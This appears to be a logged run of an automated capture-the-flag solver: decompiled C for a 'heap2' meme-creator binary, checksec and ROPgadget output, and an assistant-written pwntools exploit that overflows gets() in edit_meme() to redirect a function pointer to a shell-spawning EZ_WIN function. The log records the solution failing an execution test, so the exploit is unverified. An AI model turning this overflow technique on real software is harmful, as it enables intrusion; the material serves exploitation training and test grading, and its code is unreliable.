@@ -1,0 +1,242 @@
+{'documents': [],
+ 'error': 'yes',
+ 'generation': code(prefix='To solve this challenge, we can exploit the use of gets() in edit_meme() function which does not limit the input size and allows us to overflow into adjacent memory. This can be used to overwrite function pointers that get called in print_meme(). We can overwrite it with the address of EZ_WIN() function, so when print_meme() is called next time, it will call EZ_WIN() instead giving us a shell.', imports='from pwn import *\n', code="elf = ELF('./pwn/heap/heap-2/heap2')\n\n# Start process\np = elf.process()\n\n# Find the address of EZ_WIN function\nwin_addr = elf.symbols['EZ_WIN']\n\n# Create new meme\np.sendline('1')\np.sendline('16')  # Size of meme\np.sendline('A' * 16)  # Content of meme\n\n# Edit the meme, overflow and overwrite function pointer with win_addr\np.sendline('2')\np.sendline('0')  # Index of meme\np.sendline(cyclic(24) + p64(win_addr))  # Overwrite function pointer\n\n# Print meme to trigger the overwritten function pointer\np.sendline('3')\np.sendline('0')  # Index of meme\n\n# Interact with the shell\np.interactive()"),
+ 'info': 'Challenge is a ELF 64-bit LSB executable file and the file path is '
+         '"./pwn/heap/heap-2/heap2".\n'
+         '1.Here is the key function for exploit in the C file decompiled from '
+         'heap2:\n'
+         'int __fastcall main(int argc, const char **argv, const char **envp)\n'
+         '{\n'
+         '  unsigned int v3; // eax\n'
+         '\n'
+         '  init(argc, argv, envp);\n'
+         '  while ( 1 )\n'
+         '  {\n'
+         '    while ( 1 )\n'
+         '    {\n'
+         '      while ( 1 )\n'
+         '      {\n'
+         '        print_menu();\n'
+         '        v3 = read_int();\n'
+         '        if ( v3 != 3 )\n'
+         '          break;\n'
+         '        print_meme();\n'
+         '      }\n'
+         '      if ( v3 <= 3 )\n'
+         '        break;\n'
+         '      if ( v3 == 4 )\n'
+         '      {\n'
+         '        puts("Bye bye!");\n'
+         '        exit(0);\n'
+         '      }\n'
+         'LABEL_10:\n'
+         '      puts("Invalid choice!");\n'
+         '    }\n'
+         '    if ( v3 == 1 )\n'
+         '    {\n'
+         '      new_meme();\n'
+         '    }\n'
+         '    else\n'
+         '    {\n'
+         '      if ( v3 != 2 )\n'
+         '        goto LABEL_10;\n'
+         '      edit_meme();\n'
+         '    }\n'
+         '  }\n'
+         '}\n'
+         '\n'
+         '\n'
+         'unsigned __int64 read_int()\n'
+         '{\n'
+         '  char _0[24]; // [rsp+0h] [rbp+0h] BYREF\n'
+         '  unsigned __int64 vars18; // [rsp+18h] [rbp+18h]\n'
+         '\n'
+         '  vars18 = __readfsqword(0x28u);\n'
+         '  fgets(_0, 16, stdin);\n'
+         '  return strtoul(_0, 0LL, 10);\n'
+         '}\n'
+         '\n'
+         '\n'
+         '__int64 print_menu()\n'
+         '{\n'
+         '  puts("===Meme Creator===");\n'
+         '  puts("1. New Meme");\n'
+         '  puts("2. Edit Meme");\n'
+         '  puts("3. Print Meme");\n'
+         '  puts("4. Exit");\n'
+         '  puts("==================");\n'
+         '  return __printf_chk(1LL, "Choice: ");\n'
+         '}\n'
+         '\n'
+         '\n'
+         'void __noreturn EZ_WIN()\n'
+         '{\n'
+         '  puts("EAAAAAAAAAAAASYYYYYYYYYYYYY");\n'
+         '  system("/bin/sh");\n'
+         '  exit(0);\n'
+         '}\n'
+         '\n'
+         '\n'
+         'int new_meme()\n'
+         '{\n'
+         '  unsigned int v0; // eax\n'
+         '  unsigned int v1; // r12d\n'
+         '  __int64 v2; // rbx\n'
+         '  _QWORD *v3; // rbp\n'
+         '  _QWORD *v4; // rax\n'
+         '\n'
+         '  __printf_chk(1LL, "Enter meme size: ");\n'
+         '  v0 = read_int();\n'
+         '  if ( v0 > 0x200 )\n'
+         '  {\n'
+         '    puts("Please, noone wants to read the entire bee movie '
+         'script");\n'
+         '    exit(-1);\n'
+         '  }\n'
+         '  v1 = v0;\n'
+         '  v2 = 0LL;\n'
+         '  while ( 1 )\n'
+         '  {\n'
+         '    v3 = (_QWORD *)(memes + v2);\n'
+         '    if ( !*(_QWORD *)(memes + v2) )\n'
+         '      break;\n'
+         '    v2 += 8LL;\n'
+         '    if ( v2 == 64 )\n'
+         '    {\n'
+         '      puts("No more memes for you!");\n'
+         '      exit(-1);\n'
+         '    }\n'
+         '  }\n'
+         '  v4 = malloc(8uLL);\n'
+         '  *v3 = v4;\n'
+         '  *v4 = my_print;\n'
+         '  v4[1] = malloc(v1);\n'
+         '  __printf_chk(1LL, "Enter meme content: ");\n'
+         '  fgets(*(char **)(*(_QWORD *)(memes + v2) + 8LL), v1, stdin);\n'
+         '  return puts("Done!");\n'
+         '}\n'
+         '\n'
+         '\n'
+         'int edit_meme()\n'
+         '{\n'
+         '  __int64 v0; // rbx\n'
+         '\n'
+         '  __printf_chk(1LL, "Index: ");\n'
+         '  v0 = (unsigned int)read_int();\n'
+         '  if ( !*(_QWORD *)(memes + 8 * v0) )\n'
+         '    return puts("There\\\'s no meme there!");\n'
+         '  __printf_chk(1LL, "Enter meme content: ");\n'
+         '  gets(*(_QWORD *)(*(_QWORD *)(memes + 8 * v0) + 8LL));\n'
+         '  return puts("Done!");\n'
+         '}\n'
+         '\n'
+         '\n'
+         'int print_meme()\n'
+         '{\n'
+         '  __int64 v0; // rax\n'
+         '\n'
+         '  __printf_chk(1LL, "Index: ");\n'
+         '  v0 = *(_QWORD *)(memes + 8LL * (unsigned int)read_int());\n'
+         '  if ( v0 )\n'
+         '    return (*(__int64 (__fastcall **)(_QWORD))v0)(*(_QWORD *)(v0 + '
+         '8));\n'
+         '  else\n'
+         '    return puts("There\\\'s no meme there!");\n'
+         '}\n'
+         '\n'
+         "2.Here is the file security infomation identified by 'checksec' "
+         'command:\n'
+         '{"relro": "full", "canary": "yes", "nx": "yes", "pie": "no", '
+         '"rpath": "no", "runpath": "no", "symbols": "yes", "fortify_source": '
+         '"yes", "fortified": "1", "fortify-able": "3"}\n'
+         '\n'
+         '3.Here is some printable strings in the data sections of heap2:\n'
+         '/bin/sh\n'
+         '\n'
+         '4.We use ROPgadget to search gadgets on heap2:\n'
+         'Gadgets information\n'
+         '============================================================\n'
+         '0x00000000004017ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n'
+         '0x00000000004017ae : pop r13 ; pop r14 ; pop r15 ; ret\n'
+         '0x00000000004017b0 : pop r14 ; pop r15 ; ret\n'
+         '0x00000000004017b2 : pop r15 ; ret\n'
+         '0x00000000004017ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 '
+         '; ret\n'
+         '0x00000000004017af : pop rbp ; pop r14 ; pop r15 ; ret\n'
+         '0x00000000004012dd : pop rbp ; ret\n'
+         '0x00000000004017b3 : pop rdi ; ret\n'
+         '0x00000000004017b1 : pop rsi ; pop r15 ; ret\n'
+         '0x00000000004017ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n'
+         '0x000000000040101a : ret\n'
+         '0x00000000004016fc : ret 0x8548\n'
+         '0x00000000004014a9 : ret 0xb\n'
+         '\n'
+         'Unique gadgets found: 13\n'
+         '\n',
+ 'iterations': 1,
+ 'messages': [('user', 'How do I use pwntool to solve this challange?'),
+              ('assistant',
+               'To solve this challenge, we can exploit the use of gets() in '
+               'edit_meme() function which does not limit the input size and '
+               'allows us to overflow into adjacent memory. This can be used '
+               'to overwrite function pointers that get called in '
+               'print_meme(). We can overwrite it with the address of EZ_WIN() '
+               'function, so when print_meme() is called next time, it will '
+               'call EZ_WIN() instead giving us a shell. \n'
+               ' Imports: from pwn import *\n'
+               ' \n'
+               " Code: elf = ELF('./pwn/heap/heap-2/heap2')\n"
+               '\n'
+               '# Start process\n'
+               'p = elf.process()\n'
+               '\n'
+               '# Find the address of EZ_WIN function\n'
+               "win_addr = elf.symbols['EZ_WIN']\n"
+               '\n'
+               '# Create new meme\n'
+               "p.sendline('1')\n"
+               "p.sendline('16')  # Size of meme\n"
+               "p.sendline('A' * 16)  # Content of meme\n"
+               '\n'
+               '# Edit the meme, overflow and overwrite function pointer with '
+               'win_addr\n'
+               "p.sendline('2')\n"
+               "p.sendline('0')  # Index of meme\n"
+               'p.sendline(cyclic(24) + p64(win_addr))  # Overwrite function '
+               'pointer\n'
+               '\n'
+               '# Print meme to trigger the overwritten function pointer\n'
+               "p.sendline('3')\n"
+               "p.sendline('0')  # Index of meme\n"
+               '\n'
+               '# Interact with the shell\n'
+               'p.interactive()'),
+              ('user',
+               "Your solution failed the code execution test: 'utf-8' codec "
+               "can't decode byte 0xa0 in position 909: invalid start byte")]}
+from pwn import *
+
+elf = ELF('./pwn/heap/heap-2/heap2')
+
+# Start process
+p = elf.process()
+
+# Find the address of EZ_WIN function
+win_addr = elf.symbols['EZ_WIN']
+
+# Create new meme
+p.sendline('1')
+p.sendline('16')  # Size of meme
+p.sendline('A' * 16)  # Content of meme
+
+# Edit the meme, overflow and overwrite function pointer with win_addr
+p.sendline('2')
+p.sendline('0')  # Index of meme
+p.sendline(cyclic(24) + p64(win_addr))  # Overwrite function pointer
+
+# Print meme to trigger the overwritten function pointer
+p.sendline('3')
+p.sendline('0')  # Index of meme
+
+# Interact with the shell
+p.interactive()
